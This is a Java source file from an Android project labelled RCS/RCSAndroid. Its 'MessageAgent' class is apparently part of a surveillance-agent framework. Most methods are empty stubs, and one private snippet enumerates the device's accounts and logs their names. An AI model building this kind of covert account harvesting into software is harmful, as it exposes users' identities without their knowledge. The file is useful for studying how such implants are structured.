/* *******************************************
 * Copyright (c) 2011
 * HT srl,   All rights reserved.
 * Project      : RCS, RCSAndroid
 * File         : MessageAgent.java
 * Created      : Apr 18, 2011
 * Author		: zeno
 * *******************************************/
package com.ht.RCSAndroidGUI.agent;

import android.accounts.Account;
import android.accounts.AccountManager;
import android.util.Log;

import com.ht.RCSAndroidGUI.Status;

// TODO: Auto-generated Javadoc
/**
 * The Class MessageAgent.
 *
 * @author zeno
 */
public class MessageAgent extends AgentBase {

	/** The TAG. */
	private final String TAG = "MessageAgent";

	/* (non-Javadoc)
	 * @see com.ht.RCSAndroidGUI.agent.AgentBase#begin()
	 */
	@Override
	public void begin() {
		// TODO Auto-generated method stub

	}

	/* (non-Javadoc)
	 * @see com.ht.RCSAndroidGUI.agent.AgentBase#end()
	 */
	@Override
	public void end() {
		// TODO Auto-generated method stub

	}

	/* (non-Javadoc)
	 * @see com.ht.RCSAndroidGUI.agent.AgentBase#parse(byte[])
	 */
	@Override
	public boolean parse(AgentConf conf) {
		return false;
	}

	/* (non-Javadoc)
	 * @see com.ht.RCSAndroidGUI.ThreadBase#go()
	 */
	@Override
	public void go() {
		// TODO Auto-generated method stub

	}

	// SNIPPET
	/**
	 * Check email accounts.
	 */
	private void checkEmailAccounts() {
		final Account[] accounts = AccountManager.get(Status.getAppContext())
				.getAccounts();
		for (final Account account : accounts) {

			final String name = account.name;
			Log.d("QZ", TAG + name);
		}
	}

}
